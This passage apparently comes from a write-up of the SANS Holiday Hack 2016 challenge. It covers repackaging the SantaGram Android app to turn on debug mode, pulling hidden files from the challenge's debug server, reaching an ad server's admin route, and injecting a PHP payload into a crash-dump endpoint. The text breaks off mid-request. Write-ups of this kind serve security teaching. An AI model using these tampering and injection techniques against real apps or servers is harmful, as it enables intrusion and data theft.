<span class="hll"><span class="k">if</span> <span class="o">(</span><span class="n">z</span><span class="o">)</span> <span class="o">{</span>
</span>    <span class="k">try</span> <span class="o">{</span>
        <span class="kd">final</span> <span class="n">JSONObject</span> <span class="n">jSONObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JSONObject</span><span class="o">();</span>
        <span class="n">jSONObject</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;date&quot;</span><span class="o">,</span> <span class="k">new</span> <span class="n">SimpleDateFormat</span><span class="o">(</span><span class="s">&quot;yyyyMMddHHmmssZ&quot;</span><span class="o">).</span><span class="na">format</span><span class="o">(</span><span class="n">Calendar</span><span class="o">.</span><span class="na">getInstance</span><span class="o">().</span><span class="na">getTime</span><span class="o">()));</span>
        <span class="n">jSONObject</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;udid&quot;</span><span class="o">,</span> <span class="n">Secure</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">getContentResolver</span><span class="o">(),</span> <span class="s">&quot;android_id&quot;</span><span class="o">));</span>
        <span class="n">jSONObject</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;debug&quot;</span><span class="o">,</span> <span class="n">getClass</span><span class="o">().</span><span class="na">getCanonicalName</span><span class="o">()</span> <span class="o">+</span> <span class="s">&quot;, &quot;</span> <span class="o">+</span> <span class="n">getClass</span><span class="o">().</span><span class="na">getSimpleName</span><span class="o">());</span>
        <span class="n">jSONObject</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;freemem&quot;</span><span class="o">,</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">totalMemory</span><span class="o">()</span> <span class="o">-</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">freeMemory</span><span class="o">());</span>
        <span class="k">new</span> <span class="n">Thread</span><span class="o">(</span><span class="k">new</span> <span class="n">Runnable</span><span class="o">(</span><span class="k">this</span><span class="o">)</span> <span class="o">{</span>
            <span class="kd">final</span> <span class="cm">/* synthetic */</span> <span class="n">EditProfile</span> <span class="n">b</span><span class="o">;</span>

            <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
<span class="hll">                <span class="n">b</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">string</span><span class="o">.</span><span class="na">debug_data_collection_url</span><span class="o">),</span> <span class="n">jSONObject</span><span class="o">);</span>
</span>            <span class="o">}</span>
        <span class="o">}).</span><span class="na">start</span><span class="o">();</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">Log</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="n">getString</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">string</span><span class="o">.</span><span class="na">TAG</span><span class="o">),</span> <span class="s">&quot;Error posting JSON debug data: &quot;</span> <span class="o">+</span> <span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>However, to do so, debug mode must be enabled in the application. To check
this, the application compares the string <code>debug_data_enabled</code> in the
application resource's to <code>true</code>. Let's take a look at the resources:</p>
<div class="highlight"><pre><span class="c">&lt;!-- File res/values/strings.xml --&gt;</span>
<span class="nt">&lt;string</span> <span class="na">name=</span><span class="s">&quot;debug_data_enabled&quot;</span><span class="nt">&gt;</span>false<span class="nt">&lt;/string&gt;</span>
</pre></div>
<p>Debug data are disabled. So we need to modify the resource file of the
application in order to enable it. Luckily, this is something we often have
to do in my day job: more and more of our clients are implementing <a class="reference external" href="https://en.wikipedia.org/wiki/Certificate_pinning">TLS
certificate pinning</a>
in their mobile applications, which prevents us from intercepting the tested
application's communication with Burp.  This means that we have to decompile
the application, patch the certificate pinning code, recompile, then reinstall
the application. This is kind of what we have to do here, except instead of
patching the certificate pinning code, we just have to modify the resource file
to enable debug data.</p>
<p>I'm basically going to use <a class="reference external" href="http://blog.dewhurstsecurity.com/2015/11/10/mobile-security-certificate-pining.html">this excellent tutorial</a>
to patch the application and rebuild it without any problem.</p>
<div class="highlight"><pre><span class="c"># First, we&#39;re disassembling the application</span>
<span class="nv">$ </span>apktool d ./SantaGram_4.2.apk -o SantaGram_4.2_disassembled
I: Using Apktool 2.2.1 on SantaGram_4.2.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: ~/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
<span class="c"># Now, we modify our resource file</span>
<span class="nv">$ </span>sed -i <span class="s1">&#39;s/&lt;string name=&quot;debug_data_enabled&quot;&gt;false/&lt;string name=&quot;debug_data_enabled&quot;&gt;true/g&#39;</span> SantaGram_4.2_disassembled/res/values/strings.xml
<span class="nv">$ </span>grep <span class="s1">&#39;debug_data_enabled&#39;</span> SantaGram_4.2_disassembled/res/values/strings.xml
    &lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;debug_data_enabled&quot;</span>&gt;true&lt;/string&gt;
<span class="c"># Now, we&#39;re rebuilding our application</span>
<span class="nv">$ </span>apktool b ./SantaGram_4.2_disassembled -o SantaGram_4.2_debug.apk
I: Using Apktool 2.2.1
I: Checking whether sources has changed...
I: Smaling smali folder into classes.dex...
I: Checking whether resources has changed...
I: Building resources...
I: Building apk file...
I: Copying unknown files/dir...
<span class="c"># In order to be able to install our new APK, we must sign it, check the above</span>
<span class="c"># tutorial for instructions</span>
<span class="nv">$ </span>keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize <span class="m">2048</span> -validity 10000
<span class="o">[</span>...<span class="o">]</span>
<span class="nv">$ </span>jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore SantaGram_4.2_debug.apk alias_name
Enter Passphrase <span class="k">for</span> keystore:
jar signed.

Warning:
No -tsa or -tsacert is provided and this jar is not timestamped. Without a timestamp, users may not be able to validate this jar after the signer certificate<span class="err">&#39;</span>s expiration date <span class="o">(</span>2044-05-14<span class="o">)</span> or after any future revocation date.
</pre></div>
<p>We now have a <code>SantaGram_4.2_debug.apk</code> file, that we can install on our
phone. This application has debugging enabled, which means that we'll see
communication with the debug server.</p>
<p><em>&lt;reminder&gt;</em></p>
<p>Even though communications with the debug server is done in plain
text, the application communicates with the
<a class="reference external" href="https://www.northpolewonderland.com/">https://www.northpolewonderland.com/</a> application. Since it's TLS-encrypted, and
the application checks the validity of the certificate, you must import your
intercepting proxy's CA certificate in your telephone. Just a reminder that
Android phones can only import PEM, and that by default Burp exports its CA
certificate in DER. You can use the following OpenSSL command to convert it:</p>
<div class="highlight"><pre><span class="nv">$ </span>openssl x509 -inform der -in ./burpca.der -out burpca.pem
</pre></div>
<p><em>&lt;/reminder&gt;</em></p>
<p>We can now launch the application, log in with our credentials
<code>guest/busyreindeer78</code>, and edit our profile:</p>
<img alt="dev_edit_profile.png" class="align-center" src="/images/sans-christmas-challenge-2016/dev_edit_profile.png" />
<p>Our patch worked, because we can see some request to the debug server:</p>
<div class="highlight"><pre><span class="nf">POST</span> <span class="nn">/index.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">dev.northpolewonderland.com</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">144</span>

<span class="p">{</span><span class="nt">&quot;date&quot;</span><span class="p">:</span><span class="s2">&quot;20161227010602+0100&quot;</span><span class="p">,</span><span class="nt">&quot;udid&quot;</span><span class="p">:</span><span class="s2">&quot;58bc60a3ff0f2f1a&quot;</span><span class="p">,</span><span class="nt">&quot;debug&quot;</span><span class="p">:</span><span class="s2">&quot;com.northpolewonderland.santagram.EditProfile, EditProfile&quot;</span><span class="p">,</span><span class="nt">&quot;freemem&quot;</span><span class="p">:</span><span class="mi">26914200</span><span class="p">}</span>
</pre></div>
<div class="highlight"><pre><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.6.2</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Tue, 27 Dec 2016 00:06:03 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">250</span>

<span class="p">{</span><span class="nt">&quot;date&quot;</span><span class="p">:</span><span class="s2">&quot;20161227000603&quot;</span><span class="p">,</span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="s2">&quot;OK&quot;</span><span class="p">,</span><span class="nt">&quot;filename&quot;</span><span class="p">:</span><span class="s2">&quot;debug-20161227000603-0.txt&quot;</span><span class="p">,</span><span class="nt">&quot;request&quot;</span><span class="p">:{</span><span class="nt">&quot;date&quot;</span><span class="p">:</span><span class="s2">&quot;20161227010602+0100&quot;</span><span class="p">,</span><span class="nt">&quot;udid&quot;</span><span class="p">:</span><span class="s2">&quot;58bc60a3ff0f2f1a&quot;</span><span class="p">,</span><span class="nt">&quot;debug&quot;</span><span class="p">:</span><span class="s2">&quot;com.northpolewonderland.santagram.EditProfile, EditProfile&quot;</span><span class="p">,</span><span class="nt">&quot;freemem&quot;</span><span class="p">:</span><span class="mi">26914200</span><span class="p">,</span><span class="nt">&quot;verbose&quot;</span><span class="p">:</span><span class="kc">false</span><span class="p">}}</span>
</pre></div>
<p>We can see in the server's reponse that there's a <code>verbose</code> parameter
set to <code>false</code>. What if we set <code>&quot;verbose&quot;:true</code> in our request
(me loves some verbosity)?</p>
<div class="highlight"><pre><span class="nf">POST</span> <span class="nn">/index.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">dev.northpolewonderland.com</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">159</span>

<span class="p">{</span><span class="nt">&quot;date&quot;</span><span class="p">:</span><span class="s2">&quot;20161227001619+0100&quot;</span><span class="p">,</span><span class="nt">&quot;udid&quot;</span><span class="p">:</span><span class="s2">&quot;58bc60a3ff0f2f1a&quot;</span><span class="p">,</span><span class="nt">&quot;debug&quot;</span><span class="p">:</span><span class="s2">&quot;com.northpolewonderland.santagram.EditProfile, EditProfile&quot;</span><span class="p">,</span><span class="nt">&quot;freemem&quot;</span><span class="p">:</span><span class="mi">48663448</span><span class="p">,</span><span class="nt">&quot;verbose&quot;</span><span class="p">:</span><span class="kc">true</span><span class="p">}</span>
</pre></div>
<div class="highlight"><pre><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.6.2</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Tue, 27 Dec 2016 00:09:10 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">755</span>

<span class="p">{</span><span class="nt">&quot;date&quot;</span><span class="p">:</span><span class="s2">&quot;20161227000910&quot;</span><span class="p">,</span><span class="nt">&quot;date.len&quot;</span><span class="p">:</span><span class="mi">14</span><span class="p">,</span><span class="nt">&quot;status&quot;</span><span class="p">:</span><span class="s2">&quot;OK&quot;</span><span class="p">,</span><span class="nt">&quot;status.len&quot;</span><span class="p">:</span><span class="s2">&quot;2&quot;</span><span class="p">,</span><span class="nt">&quot;filename&quot;</span><span class="p">:</span><span class="s2">&quot;debug-20161227000910-0.txt&quot;</span><span class="p">,</span><span class="nt">&quot;filename.len&quot;</span><span class="p">:</span><span class="mi">26</span><span class="p">,</span><span class="nt">&quot;request&quot;</span><span class="p">:{</span><span class="nt">&quot;date&quot;</span><span class="p">:</span><span class="s2">&quot;20161227001619+0100&quot;</span><span class="p">,</span><span class="nt">&quot;udid&quot;</span><span class="p">:</span><span class="s2">&quot;58bc60a3ff0f2f1a&quot;</span><span class="p">,</span><span class="nt">&quot;debug&quot;</span><span class="p">:</span><span class="s2">&quot;com.northpolewonderland.santagram.EditProfile, EditProfile&quot;</span><span class="p">,</span><span class="nt">&quot;freemem&quot;</span><span class="p">:</span><span class="mi">48663448</span><span class="p">,</span><span class="nt">&quot;verbose&quot;</span><span class="p">:</span><span class="kc">true</span><span class="p">},</span><span class="nt">&quot;files&quot;</span><span class="p">:[</span><span class="s2">&quot;debug-20161224235959-0.mp3&quot;</span><span class="p">,</span><span class="s2">&quot;debug-20161226231736-0.txt&quot;</span><span class="p">,</span><span class="s2">&quot;debug-20161226232005-0.txt&quot;</span><span class="p">,</span><span class="s2">&quot;debug-20161226232057-0.txt&quot;</span><span class="p">,</span><span class="s2">&quot;debug-20161226232243-0.txt&quot;</span><span class="p">,</span><span class="s2">&quot;debug-20161226232507-0.txt&quot;</span><span class="p">,</span><span class="s2">&quot;debug-20161226232516-0.txt&quot;</span><span class="p">,</span><span class="s2">&quot;debug-20161226233655-0.txt&quot;</span><span class="p">,</span><span class="s2">&quot;debug-20161226234235-0.txt&quot;</span><span class="p">,</span><span class="s2">&quot;debug-20161226234246-0.txt&quot;</span><span class="p">,</span><span class="s2">&quot;debug-20161226234259-0.txt&quot;</span><span class="p">,</span><span class="s2">&quot;debug-20161226234313-0.txt&quot;</span><span class="p">,</span><span class="s2">&quot;debug-20161227000501-0.txt&quot;</span><span class="p">,</span><span class="s2">&quot;debug-20161227000603-0.txt&quot;</span><span class="p">,</span><span class="s2">&quot;debug-20161227000910-0.txt&quot;</span><span class="p">,</span><span class="s2">&quot;index.php&quot;</span><span class="p">]}</span>
</pre></div>
<p>Yes! Many more informations were sent back, including the name of our audio
file, <code>debug-20161224235959-0.mp3</code>.</p>
<p>We can now download our audio file at this URL: <a class="reference external" href="http://dev.northpolewonderland.com/debug-20161224235959-0.mp3">http://dev.northpolewonderland.com/debug-20161224235959-0.mp3</a></p>
<img alt="dev_audio_file.png" class="align-center" src="/images/sans-christmas-challenge-2016/dev_audio_file.png" />
</div>
<div class="section" id="the-banner-ad-server">
<h3><a class="reference external" href="http://ads.northpolewonderland.com/">The Banner Ad Server</a></h3>
<p>The SantaGram bug bounty program is apparently running an ad server, so as to
display ad in the Android application. If we go to this ad web server, we can
see that it's running the <a class="reference external" href="https://www.meteor.com/">Meteor Javascript framework</a>:</p>
<div class="highlight"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="hll">  <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">type=</span><span class="s">&quot;text/css&quot;</span> <span class="na">class=</span><span class="s">&quot;__meteor-css__&quot;</span> <span class="na">href=</span><span class="s">&quot;/d1281f37fbafb6db67a052e58c901679c5cabcc2.css?meteor_css_resource=true&quot;</span><span class="nt">&gt;</span>
</span><span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">&quot;utf-8&quot;</span><span class="nt">&gt;&lt;meta</span> <span class="na">http-equiv=</span><span class="s">&quot;X-UA-Compatible&quot;</span> <span class="na">content=</span><span class="s">&quot;IE=edge&quot;</span><span class="nt">&gt;&lt;meta</span> <span class="na">name=</span><span class="s">&quot;viewport&quot;</span> <span class="na">content=</span><span class="s">&quot;width=device-width, initial-scale=1&quot;</span><span class="nt">&gt;</span><span class="c">&lt;!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags--&gt;</span><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">&quot;description&quot;</span> <span class="na">content=</span><span class="s">&quot;Holiday Hack&quot;</span><span class="nt">&gt;&lt;title&gt;</span>Ad Nauseam - Stupid Ads for Stupid People<span class="nt">&lt;/title&gt;</span>

<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>

<span class="hll"><span class="nt">&lt;script </span><span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span><span class="nt">&gt;</span><span class="nx">__meteor_runtime_config__</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nb">decodeURIComponent</span><span class="p">(</span><span class="s2">&quot;%7B%22meteorRelease%22%3A%22METEOR%401.4.2.3%22%2C%22meteorEnv%22%3A%7B%22NODE_ENV%22%3A%22production%22%2C%22TEST_METADATA%22%3A%22%7B%7D%22%7D%2C%22PUBLIC_SETTINGS%22%3A%7B%7D%2C%22ROOT_URL%22%3A%22http%3A%2F%2Fads.northpolewonderland.com%22%2C%22ROOT_URL_PATH_PREFIX%22%3A%22%22%2C%22appId%22%3A%221vgh1e61x7h692h4hyt1%22%2C%22autoupdateVersion%22%3A%22537dcf6b4594db16ea2d99d0a920f2deeb7dc9f1%22%2C%22autoupdateVersionRefreshable%22%3A%2205c3f7dba9f3e15efa3d971acf18cab901dc0505%22%2C%22autoupdateVersionCordova%22%3A%22none%22%7D&quot;</span><span class="p">));</span><span class="nt">&lt;/script&gt;</span>
</span>
<span class="hll">  <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">&quot;text/javascript&quot;</span> <span class="na">src=</span><span class="s">&quot;/fedc8e9f69dab9d81a4f227d6ec76567fcb56231.js?meteor_js_resource=true&quot;</span><span class="nt">&gt;&lt;/script&gt;</span>
</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></div>
<p>What a crazy random happenstance, it just so happens that <a class="reference external" href="https://pen-testing.sans.org/blog/2016/12/06/mining-meteor">an article</a>
about pentesting Meteor-based web applications was recently published on the
SANS blog.</p>
<p>So, let's spin <a class="reference external" href="https://tampermonkey.net/">Tampermonkey</a>, with the <a class="reference external" href="https://github.com/nidem/MeteorMiner/">Meteor
Miner</a> script, to see what kind of
informations we can extract from the applications. On this screenshot, we can
see that we have access to the quotes printed on the front page:</p>
<img alt="ads_meteor_miner_front.png" class="align-center" src="/images/sans-christmas-challenge-2016/ads_meteor_miner_front.png" />
<p>We can also see that there's an <a class="reference external" href="http://ads.northpolewonderland.com/admin/quotes">/admin/quotes</a>
page:</p>
<img alt="ads_meteor_miner_admin_route.png" class="align-center" src="/images/sans-christmas-challenge-2016/ads_meteor_miner_admin_route.png" />
<p>If we go to it, even if we're supposed to be logged in, we can see that
there's one quote more than on the front page:</p>
<img alt="ads_meteor_miner_admin_page.png" class="align-center" src="/images/sans-christmas-challenge-2016/ads_meteor_miner_admin_page.png" />
<p>In one of these quotes, we can see that there's a link to the MP3 file we want.
We can then download the MP3 file from this URL: <a class="reference external" href="http://ads.northpolewonderland.com/ofdAR4UYRaeNxMg/discombobulatedaudio5.mp3">http://ads.northpolewonderland.com/ofdAR4UYRaeNxMg/discombobulatedaudio5.mp3</a></p>
<img alt="ads_result.png" class="align-center" src="/images/sans-christmas-challenge-2016/ads_result.png" />
</div>
<div class="section" id="the-uncaught-exception-handler-server">
<h3><a class="reference external" href="http://ex.northpolewonderland.com/exception.php">The Uncaught Exception Handler Server</a></h3>
<p>When the Android application encounters a Java exception, it's sent to an
exception handling server: <a class="reference external" href="http://ex.northpolewonderland.com/exception.php">http://ex.northpolewonderland.com/exception.php</a>.
For example, when I first tried to run the Santagram application on a virtual
Android device, this exception was sent (some problem with the resolution of
my virtual device):</p>
<div class="highlight"><pre><span class="nf">POST</span> <span class="nn">/exception.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">ex.northpolewonderland.com</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">3860</span>

<span class="p">{</span><span class="nt">&quot;operation&quot;</span><span class="p">:</span><span class="s2">&quot;WriteCrashDump&quot;</span><span class="p">,</span><span class="nt">&quot;data&quot;</span><span class="p">:{</span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="s2">&quot;Canvas: trying to draw too large(113246208bytes) bitmap.&quot;</span><span class="p">,</span><span class="nt">&quot;lmessage&quot;</span><span class="p">:</span><span class="s2">&quot;Canvas: trying to draw too large(113246208bytes) bitmap.&quot;</span><span class="p">,</span><span class="nt">&quot;strace&quot;</span><span class="p">:</span><span class="s2">&quot;java.lang.RuntimeException: Canvas: trying to draw too large(113246208bytes) bitmap.\n\tat android.view.DisplayListCanvas.throwIfCannotDraw(DisplayListCanvas.java:260)\n\tat android.graphics.Canvas.drawBitmap(Canvas.java:1415)\n\tat android.graphics.drawable.BitmapDrawable.draw(BitmapDrawable.java:528)\n\tat android.widget.ImageView.onDraw(ImageView.java:1316)\n\tat android.view.View.draw(View.java:17185)\n\tat android.view.View.updateDisplayListIfDirty(View.java:16167)\n\tat android.view.View.draw(View.java:16951)\n\tat android.view.ViewGroup.drawChild(ViewGroup.java:3727)\n\tat android.view.ViewGroup.dispatchDraw(ViewGroup.java:3513)\n\tat android.view.View.updateDisplayListIfDirty(View.java:16162)\n\tat android.view.View.draw(View.java:16951)\n\tat android.view.ViewGroup.drawChild(ViewGroup.java:3727)\n\tat android.view.ViewGroup.dispatchDraw(ViewGroup.java:3513)\n\tat android.view.View.updateDisplayListIfDirty(View.java:16162)\n\tat android.view.View.draw(View.java:16951)\n\tat android.view.ViewGroup.drawChild(ViewGroup.java:3727)\n\tat android.view.ViewGroup.dispatchDraw(ViewGroup.java:3513)\n\tat android.view.View.updateDisplayListIfDirty(View.java:16162)\n\tat android.view.View.draw(View.java:16951)\n\tat android.view.ViewGroup.drawChild(ViewGroup.java:3727)\n\tat android.view.ViewGroup.dispatchDraw(ViewGroup.java:3513)\n\tat android.view.View.updateDisplayListIfDirty(View.java:16162)\n\tat android.view.View.draw(View.java:16951)\n\tat android.view.ViewGroup.drawChild(ViewGroup.java:3727)\n\tat android.view.ViewGroup.dispatchDraw(ViewGroup.java:3513)\n\tat android.view.View.updateDisplayListIfDirty(View.java:16162)\n\tat android.view.View.draw(View.java:16951)\n\tat android.view.ViewGroup.drawChild(ViewGroup.java:3727)\n\tat android.view.ViewGroup.dispatchDraw(ViewGroup.java:3513)\n\tat android.view.View.draw(View.java:17188)\n\tat com.android.internal.policy.DecorView.draw(DecorView.java:753)\n\tat android.view.View.updateDisplayListIfDirty(View.java:16167)\n\tat android.view.ThreadedRenderer.updateViewTreeDisplayList(ThreadedRenderer.java:648)\n\tat android.view.ThreadedRenderer.updateRootDisplayList(ThreadedRenderer.java:654)\n\tat android.view.ThreadedRenderer.draw(ThreadedRenderer.java:762)\n\tat android.view.ViewRootImpl.draw(ViewRootImpl.java:2800)\n\tat android.view.ViewRootImpl.performDraw(ViewRootImpl.java:2608)\n\tat android.view.ViewRootImpl.performTraversals(ViewRootImpl.java:2215)\n\tat android.view.ViewRootImpl.doTraversal(ViewRootImpl.java:1254)\n\tat android.view.ViewRootImpl$TraversalRunnable.run(ViewRootImpl.java:6337)\n\tat android.view.Choreographer$CallbackRecord.run(Choreographer.java:874)\n\tat android.view.Choreographer.doCallbacks(Choreographer.java:686)\n\tat android.view.Choreographer.doFrame(Choreographer.java:621)\n\tat android.view.Choreographer$FrameDisplayEventReceiver.run(Choreographer.java:860)\n\tat android.os.Handler.handleCallback(Handler.java:751)\n\tat android.os.Handler.dispatchMessage(Handler.java:95)\n\tat android.os.Looper.loop(Looper.java:154)\n\tat android.app.ActivityThread.main(ActivityThread.java:6119)\n\tat java.lang.reflect.Method.invoke(Native Method)\n\tat com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:886)\n\tat com.android.internal.os.ZygoteInit.main(ZygoteInit.java:776)\n&quot;</span><span class="p">,</span><span class="nt">&quot;model&quot;</span><span class="p">:</span><span class="s2">&quot;Android SDK built for x86&quot;</span><span class="p">,</span><span class="nt">&quot;sdkint&quot;</span><span class="p">:</span><span class="s2">&quot;25&quot;</span><span class="p">,</span><span class="nt">&quot;device&quot;</span><span class="p">:</span><span class="s2">&quot;generic_x86&quot;</span><span class="p">,</span><span class="nt">&quot;product&quot;</span><span class="p">:</span><span class="s2">&quot;sdk_google_phone_x86&quot;</span><span class="p">,</span><span class="nt">&quot;lversion&quot;</span><span class="p">:</span><span class="s2">&quot;3.10.0+&quot;</span><span class="p">,</span><span class="nt">&quot;vmheapsz&quot;</span><span class="p">:</span><span class="s2">&quot;123054440&quot;</span><span class="p">,</span><span class="nt">&quot;vmallocmem&quot;</span><span class="p">:</span><span class="s2">&quot;119010712&quot;</span><span class="p">,</span><span class="nt">&quot;vmheapszlimit&quot;</span><span class="p">:</span><span class="s2">&quot;536870912&quot;</span><span class="p">,</span><span class="nt">&quot;natallocmem&quot;</span><span class="p">:</span><span class="s2">&quot;7198792&quot;</span><span class="p">,</span><span class="nt">&quot;cpuusage&quot;</span><span class="p">:</span><span class="s2">&quot;0.08108108&quot;</span><span class="p">,</span><span class="nt">&quot;totalstor&quot;</span><span class="p">:</span><span class="s2">&quot;1560133632&quot;</span><span class="p">,</span><span class="nt">&quot;freestor&quot;</span><span class="p">:</span><span class="s2">&quot;120262656&quot;</span><span class="p">,</span><span class="nt">&quot;busystor&quot;</span><span class="p">:</span><span class="s2">&quot;1439870976&quot;</span><span class="p">,</span><span class="nt">&quot;udid&quot;</span><span class="p">:</span><span class="s2">&quot;58bc60a3ff0f2f1a&quot;</span><span class="p">}}</span>
</pre></div>
<p>I got this response from the server:</p>
<div class="highlight"><pre><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.10.2</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Mon, 26 Dec 2016 22:19:50 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">81</span>

{
    &quot;success&quot; : true,
    &quot;folder&quot; : &quot;docs&quot;,
    &quot;crashdump&quot; : &quot;crashdump-WgyLFG.php&quot;
}
</pre></div>
<p>So, apparently, a file <code>docs/crashdump-WgyLFG.php</code> was created. That's
very interesting, because this means that we may be able to upload valid
PHP code to be executed. The first thing I did was try to put PHP code in
the exception, to see if it was executed:</p>
<div class="highlight"><pre><span class="nf">POST</span> <span class="nn">/exception.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">ex.northpolewonderland.com</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">429</span>

<span class="p">{</span><span class="nt">&quot;operation&quot;</span><span class="p">:</span><span class="s2">&quot;WriteCrashDump&quot;</span><span class="p">,</span><span class="nt">&quot;data&quot;</span><span class="p">:{</span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="s2">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span><span class="p">,</span><span class="nt">&quot;lmessage&quot;</span><span class="p">:</span><span class="s2">&quot;Message.&quot;</span><span class="p">,</span><span class="nt">&quot;strace&quot;</span><span class="p">:</span><span class="s2">&quot;Stack trace&quot;</span><span class="p">,</span><span class="nt">&quot;sdkint&quot;</span><span class="p">:</span><span class="s2">&quot;25&quot;</span><span class="p">,</span><span class="nt">&quot;device&quot;</span><span class="p">:</span><span class="s2">&quot;generic_x86&quot;</span><span class="p">,</span><span class="nt">&quot;product&quot;</span><span class="p">:</span><span class="s2">&quot;sdk_google_phone_x86&quot;</span><span class="p">,</span><span class="nt">&quot;lversion&quot;</span><span class="p">:</span><span class="s2">&quot;3.10.0+&quot;</span><span class="p">,</span><span class="nt">&quot;vmheapsz&quot;</span><span class="p">:</span><span class="s2">&quot;123054440&quot;</span><span class="p">,</span><span class="nt">&quot;vmallocmem&quot;</span><span class="p">:</span><span 